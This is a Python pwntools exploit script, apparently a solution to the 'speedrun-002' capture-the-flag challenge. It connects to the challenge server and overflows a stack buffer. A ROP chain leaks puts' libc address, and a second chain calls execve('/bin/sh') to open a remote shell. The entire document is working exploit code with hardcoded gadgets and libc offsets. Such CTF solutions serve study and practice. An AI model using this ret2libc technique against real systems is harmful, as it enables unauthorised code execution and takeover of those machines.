from pwn import *

#r = process("./speedrun-002")
r = remote("speedrun-002.quals2019.oooverflow.io", 31337)

#addresses
puts_plt = 0x4005b0					#objdump -D speedrun-002 | grep puts
puts_got = 0x601028					#objdump -R speedrun-002 | grep puts
attackme = 0x40074c

#gadgets
pop_rdi_ret = 0x4008a3
pop_rsi_r15_ret = 0x4008a1
pop_rdx_ret = 0x4006ec

#make first payload to find puts address
payload = "A" * 0x400 + "B" * 8		#dummy for bof
payload += p64(pop_rdi_ret)			#pop rdi; ret
payload += p64(puts_got)			#address of puts in LIBC
payload += p64(puts_plt)			#address of puts in plt
payload += p64(attackme)			#make loop

#send payload
print "1", r.readline()	,			#skip 'We meet again on these pwning streets.'
print "2", r.readline()	,			#skip 'What say you now?'
r.sendline("Everything intelligent is so boring.")
print "3", r.readline()	,			#skip 'What an interesting thing to say.'
print "4", r.readline()	,			#skip 'Tell me more'
r.sendline(payload)					#send payload here
print "5", r.readline()	,			#skip 'Fascinating.'

#check result
msg = r.readline()					#receive puts address in LIBC
print "msg", msg.encode("hex")
puts_addr = int(msg[:6][::-1].encode("hex"), 16)	#change endian and parse it
print "puts_addr", hex(puts_addr)

#### after finding libc info from leaked address using https://libc.blukat.me ####
#address info from libc
puts_offset = 0x0809c0
libc_base = puts_addr - puts_offset	#get libc base
print "libc_base", hex(libc_base)

system = libc_base + 0x04f440
str_bin_sh = libc_base + 0x1b3e9a
execve = libc_base + 0x0e4e30

#make second payload to get the shell
payload = "A" * 0x400 + "B" * 8
payload += p64(pop_rdi_ret)				#rdi = /bin/sh
payload += p64(str_bin_sh)
payload += p64(pop_rsi_r15_ret)			#rsi = NULL
payload += p64(0)
payload += p64(0)
payload += p64(pop_rdx_ret)				#rdx = NULL
payload += p64(0)
payload += p64(execve)	#call execve

#payload += p64(pop_rdi_ret)			#rdi = /bin/sh
#payload += p64(str_bin_sh)
#payload += p64(system)
#payload += p64(attackme)

#send payload
print "2", r.readline()	,			#What say you now?
r.sendline("Everything intelligent is so boring.")
print "3", r.readline()	,			#What an interesting thing to say.
print "4", r.readline()	,			#Tell me more
r.sendline(payload)

#enjoy shell!
r.interactive()
